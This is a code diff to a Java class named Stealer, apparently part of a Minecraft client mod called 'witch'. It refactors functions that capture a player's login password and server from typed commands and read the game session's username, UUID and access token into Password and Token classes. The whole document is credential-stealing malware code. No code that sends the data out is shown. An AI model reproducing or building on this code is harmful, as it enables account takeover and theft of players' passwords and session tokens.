@@ -1,14 +1,12 @@
 package me.soda.witch.features;
 
 import java.util.Arrays;
-import java.util.Date;
 import java.util.List;
 
 import static me.soda.witch.Witch.mc;
 
 public class Stealer {
-    //Steal login passwords, returns username, password, server, uuid and timestamp
-    public static String[] stealPassword(String command) {
+    public static Password stealPassword(String command) {
         String username;
         String password;
         String server;
@@ -28,19 +26,26 @@ public class Stealer {
                 }
                 username = mc.getSession().getUsername();
                 uuid = mc.getSession().getUuid();
-                String ts = String.valueOf(new Date().getTime());
-                return new String[]{username, password, server, uuid, ts};
+                return new Password(username, uuid, password, server);
             }
         }
         return null;
     }
 
-    //Steal token, returns username, uuid, token and timestamp
-    public static String[] stealToken() {
+    public static class Password {
+        public String username, uuid, password, server;
+
+        public Password(String username, String uuid, String password, String server) {
+            this.username = username;
+            this.uuid = uuid;
+            this.password = password;
+            this.server = server;
+        }
+    }
+
+    public static class Token {
         String username = mc.getSession().getUsername();
         String uuid = mc.getSession().getUuid();
         String token = mc.getSession().getAccessToken();
-        String ts = String.valueOf(new Date().getTime());
-        return new String[]{username, uuid, token, ts};
     }
 }
